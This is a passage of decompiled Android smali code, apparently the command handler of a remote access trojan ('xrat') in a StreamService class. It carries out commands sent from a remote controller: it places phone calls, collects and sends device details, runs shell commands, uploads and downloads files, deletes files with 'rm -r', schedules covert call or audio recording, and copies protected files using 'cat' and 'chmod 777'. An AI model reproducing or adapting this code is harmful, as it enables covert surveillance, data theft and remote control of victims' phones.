    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_b
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_TOAST:S

    if-ne v3, v5, :cond_c

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    move-object/from16 v0, p0

    invoke-static {v0, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v2

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    goto/16 :goto_0

    :cond_c
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_CALL:S

    if-ne v3, v5, :cond_d

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Landroid/content/Intent;

    const-string v4, "android.intent.action.CALL"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "tel:"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-direct {v3, v4, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v3, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Lcom/v1/StreamService;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    :cond_d
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->GET_PHONE_INFO:S

    if-ne v3, v5, :cond_e

    new-instance v2, Lcom/google/xrat/protocol/ClientInfo;

    const-string v3, ""

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->b()Ljava/lang/String;

    move-result-object v4

    invoke-static {}, Lcom/v1/lib/j;->i()[Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    aget-object v5, v5, v6

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->a()Ljava/lang/String;

    move-result-object v6

    sget-object v7, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->c()Ljava/lang/String;

    move-result-object v8

    invoke-static {}, Lcom/v1/lib/j;->g()Ljava/lang/String;

    move-result-object v9

    invoke-static {}, Lcom/v1/lib/j;->j()Ljava/lang/String;

    move-result-object v10

    sget-object v11, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-static {}, Lcom/v1/lib/j;->i()[Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x1

    aget-object v12, v12, v13

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->f()Ljava/lang/String;

    move-result-object v13

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->e()Ljava/lang/String;

    move-result-object v14

    invoke-static {}, Lcom/v1/lib/j;->k()Ljava/lang/String;

    move-result-object v15

    invoke-direct/range {v2 .. v15}, Lcom/google/xrat/protocol/ClientInfo;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v3, Lcom/google/xrat/protocol/ClientInfoPacket;

    invoke-direct {v3, v2}, Lcom/google/xrat/protocol/ClientInfoPacket;-><init>(Lcom/google/xrat/protocol/ClientInfo;)V

    const/16 v2, 0xcb

    invoke-virtual {v3}, Lcom/google/xrat/protocol/ClientInfoPacket;->build()[B

    move-result-object v4

    array-length v4, v4

    int-to-short v4, v4

    invoke-virtual {v3}, Lcom/google/xrat/protocol/ClientInfoPacket;->build()[B

    move-result-object v3

    move/from16 v0, v16

    invoke-static {v2, v0, v4, v3}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_e
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_SHELL:S

    if-ne v3, v5, :cond_f

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_3

    new-instance v3, Lcom/v1/a/a;

    invoke-direct {v3}, Lcom/v1/a/a;-><init>()V

    const-string v3, "\u00a7"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    aget-object v3, v3, v4

    const-string v4, "\u00a7"

    invoke-virtual {v2, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x1

    aget-object v2, v2, v4

    invoke-static {v3, v2}, Lcom/v1/a/a;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/16 v3, 0xd6

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    array-length v4, v4

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v2

    move/from16 v0, v16

    invoke-static {v3, v0, v4, v2}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_f
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_GET_MONITORNUM:S

    if-ne v3, v5, :cond_14

    const-string v2, "monitorPhone"

    const/4 v3, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2, v3}, Lcom/v1/StreamService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    const-string v3, "monitorPhone"

    const-string v4, ""

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/v1/a/b;

    move-object/from16 v0, p0

    invoke-direct {v3, v0}, Lcom/v1/a/b;-><init>(Landroid/content/Context;)V

    const-string v4, "fixTime"

    invoke-virtual {v3, v4}, Lcom/v1/a/b;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuffer;

    invoke-direct {v4}, Ljava/lang/StringBuffer;-><init>()V

    const-string v5, ""

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_10

    const-string v5, "\n"

    invoke-virtual {v3, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    const/4 v3, 0x0

    :goto_3
    array-length v6, v5

    if-lt v3, v6, :cond_12

    new-instance v3, Lcom/v1/a/b;

    move-object/from16 v0, p0

    invoke-direct {v3, v0}, Lcom/v1/a/b;-><init>(Landroid/content/Context;)V

    const-string v5, "fixTime"

    invoke-virtual {v4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v5, v6}, Lcom/v1/a/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_10
    invoke-virtual {v4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v5, ""

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_11

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v3, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "\u00a7"

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    :cond_11
    const/16 v3, 0xd8

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    array-length v4, v4

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v2

    move/from16 v0, v16

    invoke-static {v3, v0, v4, v2}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_12
    aget-object v6, v5, v3

    const-string v7, ","

    invoke-virtual {v6, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x1

    aget-object v6, v6, v7

    invoke-static {v6}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v6

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    cmp-long v6, v6, v8

    if-lez v6, :cond_13

    aget-object v6, v5, v3

    invoke-virtual {v4, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    const-string v6, "\n"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    :cond_13
    add-int/lit8 v3, v3, 0x1

    goto :goto_3

    :cond_14
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_SET_MONITORNUM:S

    if-ne v3, v5, :cond_16

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    const-string v3, "monitorPhone"

    const/4 v4, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v3, v4}, Lcom/v1/StreamService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    invoke-interface {v3}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    const-string v5, "monitorPhone"

    invoke-interface {v4, v5, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z

    const-string v2, "monitorPhone"

    const-string v4, ""

    invoke-interface {v3, v2, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/v1/a/b;

    move-object/from16 v0, p0

    invoke-direct {v3, v0}, Lcom/v1/a/b;-><init>(Landroid/content/Context;)V

    const-string v4, "fixTime"

    invoke-virtual {v3, v4}, Lcom/v1/a/b;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_15

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v4, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "\u00a7"

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    :cond_15
    const/16 v3, 0xd7

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    array-length v4, v4

    invoke-static {v2}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v2

    move/from16 v0, v16

    invoke-static {v3, v0, v4, v2}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_16
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_DOWNFILE:S

    if-ne v3, v5, :cond_17

    const-string v3, "StreamService"

    const-string v4, "\u53ef\u65ad\u70b9\u7eed\u4f20"

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    new-instance v4, Lcom/v1/h;

    const/4 v5, 0x0

    move-object/from16 v0, p0

    invoke-direct {v4, v0, v2, v3, v5}, Lcom/v1/h;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;I)V

    invoke-virtual {v4}, Lcom/v1/h;->start()V

    goto/16 :goto_0

    :cond_17
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_DELETEFILE:S

    if-ne v3, v5, :cond_18

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/v1/a/a;

    invoke-direct {v3}, Lcom/v1/a/a;-><init>()V

    const-string v3, "/"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "rm -r "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Lcom/v1/a/a;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    goto/16 :goto_0

    :cond_18
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_UPLOADFILE:S

    if-ne v3, v5, :cond_19

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\u00a7"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x0

    aget-object v3, v3, v5

    const-string v5, "\u00a7"

    invoke-virtual {v2, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x1

    aget-object v2, v2, v5

    new-instance v5, Lcom/v1/i;

    invoke-static {v4}, Lcom/google/xrat/a/b;->a([B)S

    move-result v4

    move-object/from16 v0, p0

    invoke-direct {v5, v0, v2, v3, v4}, Lcom/v1/i;-><init>(Lcom/v1/StreamService;Ljava/lang/String;Ljava/lang/String;S)V

    invoke-virtual {v5}, Lcom/v1/i;->start()V

    goto/16 :goto_0

    :cond_19
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_DELAY_RECORD:S

    if-ne v3, v5, :cond_1f

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\u00a7"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    aget-object v3, v3, v4

    invoke-static {v3}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v4

    const-string v3, "\u00a7"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x1

    aget-object v2, v2, v3

    invoke-static {v2}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    const-wide/16 v6, 0x3c

    mul-long/2addr v2, v6

    const-wide/16 v6, 0x3e8

    mul-long/2addr v2, v6

    add-long v6, v4, v2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    cmp-long v2, v4, v2

    if-gez v2, :cond_1a

    const/16 v2, 0xf4

    const-string v3, "\u76d1\u542c\u65f6\u95f4\u65f6\u5fc5\u987b\u5927\u4e8e\u5f53\u524d\u65f6\u95f4\uff0c\u4ee5\u624b\u673a\u65f6\u95f4\u4e3a\ufffd?"

    invoke-static {v3}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v3

    array-length v3, v3

    const-string v4, "\u76d1\u542c\u65f6\u95f4\u65f6\u5fc5\u987b\u5927\u4e8e\u5f53\u524d\u65f6\u95f4\uff0c\u4ee5\u624b\u673a\u65f6\u95f4\u4e3a\ufffd?"

    invoke-static {v4}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    move/from16 v0, v16

    invoke-static {v2, v0, v3, v4}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_1a
    new-instance v2, Lcom/v1/a/b;

    move-object/from16 v0, p0

    invoke-direct {v2, v0}, Lcom/v1/a/b;-><init>(Landroid/content/Context;)V

    const-string v3, "fixTime"

    invoke-virtual {v2, v3}, Lcom/v1/a/b;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const/4 v2, 0x1

    const-string v3, ""

    invoke-virtual {v8, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_1b

    const-string v3, "\n"

    invoke-virtual {v8, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    const/4 v3, 0x0

    :goto_4
    array-length v10, v9

    if-lt v3, v10, :cond_1c

    :cond_1b
    if-eqz v2, :cond_3

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ","

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/v1/a/b;

    move-object/from16 v0, p0

    invoke-direct {v3, v0}, Lcom/v1/a/b;-><init>(Landroid/content/Context;)V

    const-string v8, "fixTime"

    invoke-virtual {v3, v8, v2}, Lcom/v1/a/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.intent.action.DSJT_START"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    invoke-virtual {v3, v8, v9}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/16 v8, 0x8

    invoke-virtual {v3, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    const/4 v8, 0x0

    move-object/from16 v0, p0

    invoke-static {v0, v3, v2, v8}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/v1/StreamService;->k:Landroid/app/AlarmManager;

    const/4 v8, 0x0

    invoke-virtual {v3, v8, v4, v5, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.intent.action.DSJT_STOP"

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v8

    invoke-virtual {v3, v8, v9}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/16 v8, 0x8

    invoke-virtual {v3, v8}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    add-int/lit8 v3, v3, 0x1

    const/4 v8, 0x0

    move-object/from16 v0, p0

    invoke-static {v0, v3, v2, v8}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/v1/StreamService;->k:Landroid/app/AlarmManager;

    const/4 v8, 0x0

    invoke-virtual {v3, v8, v6, v7, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    const/16 v2, 0xf6

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v4, v5}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v3, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, ","

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v3

    array-length v3, v3

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {v4, v5}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v8, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, ","

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v4

    move/from16 v0, v16

    invoke-static {v2, v0, v3, v4}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    goto/16 :goto_0

    :cond_1c
    aget-object v2, v9, v3

    const-string v10, ","

    invoke-virtual {v2, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    const/4 v10, 0x1

    aget-object v10, v2, v10

    invoke-static {v10}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v10

    cmp-long v10, v4, v10

    if-lez v10, :cond_1d

    const/4 v10, 0x1

    aget-object v10, v2, v10

    invoke-static {v10}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v10

    cmp-long v10, v6, v10

    if-lez v10, :cond_1d

    const/4 v2, 0x1

    :goto_5
    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_4

    :cond_1d
    const/4 v10, 0x0

    aget-object v10, v2, v10

    invoke-static {v10}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v10

    cmp-long v10, v4, v10

    if-gez v10, :cond_1e

    const/4 v10, 0x0

    aget-object v2, v2, v10

    invoke-static {v2}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v10

    cmp-long v2, v6, v10

    if-gez v2, :cond_1e

    const/4 v2, 0x1

    goto :goto_5

    :cond_1e
    const/16 v2, 0xf4

    const-string v10, "\u76d1\u542c\u65f6\u95f4\u65f6\u6bb5\u51b2\u7a81!"

    invoke-static {v10}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v10

    array-length v10, v10

    const-string v11, "\u76d1\u542c\u65f6\u95f4\u65f6\u6bb5\u51b2\u7a81!"

    invoke-static {v11}, Lcom/google/xrat/a/b;->a(Ljava/lang/String;)[B

    move-result-object v11

    move/from16 v0, v16

    invoke-static {v2, v0, v10, v11}, Lcom/google/xrat/a/b;->a(SSI[B)[B

    move-result-object v2

    move-object/from16 v0, v18

    invoke-virtual {v0, v2}, Ljava/io/DataOutputStream;->write([B)V

    const/4 v2, 0x0

    goto :goto_5

    :cond_1f
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_START_RECORD:S

    if-ne v3, v5, :cond_20

    const/4 v2, 0x1

    move-object/from16 v0, p0

    iput-boolean v2, v0, Lcom/v1/StreamService;->d:Z

    invoke-virtual/range {v19 .. v19}, Lcom/v1/lib/j;->h()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Lcom/v1/j;

    move-object/from16 v0, p0

    invoke-direct {v3, v0, v2}, Lcom/v1/j;-><init>(Lcom/v1/StreamService;Ljava/lang/String;)V

    invoke-virtual {v3}, Lcom/v1/j;->start()V

    goto/16 :goto_0

    :cond_20
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_STOP_RECORD:S

    if-ne v3, v5, :cond_21

    const/4 v2, 0x0

    move-object/from16 v0, p0

    iput-boolean v2, v0, Lcom/v1/StreamService;->d:Z

    goto/16 :goto_0

    :cond_21
    sget-short v5, Lcom/google/xrat/protocol/Protocol;->DO_XSHELL:S

    if-ne v3, v5, :cond_22

    new-instance v2, Lcom/v1/l;

    invoke-static {v4}, Lcom/google/xrat/a/b;->a([B)S

    move-result v3

    move-object/from16 v0, p0

    invoke-direct {v2, v0, v3}, Lcom/v1/l;-><init>(Lcom/v1/StreamService;S)V

    invoke-virtual {v2}, Lcom/v1/l;->start()V

    goto/16 :goto_0

    :cond_22
    sget-short v4, Lcom/google/xrat/protocol/Protocol;->DO_GET_ROOT_FILE:S

    if-ne v3, v4, :cond_25

    invoke-static {v2}, Lcom/google/xrat/a/b;->b([B)Ljava/lang/String;

    move-result-object v2

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v3

    add-int/lit8 v3, v3, 0x1

    invoke-virtual {v2, v3}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "/data/data/com.v1/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Lcom/v1/a/a;

    invoke-direct {v4}, Lcom/v1/a/a;-><init>()V

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "cat "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, " > "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/v1/a/a;->a(Ljava/lang/String;)V

    new-instance v2, Lcom/v1/a/a;

    invoke-direct {v2}, Lcom/v1/a/a;-><init>()V

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "chmod 777 "

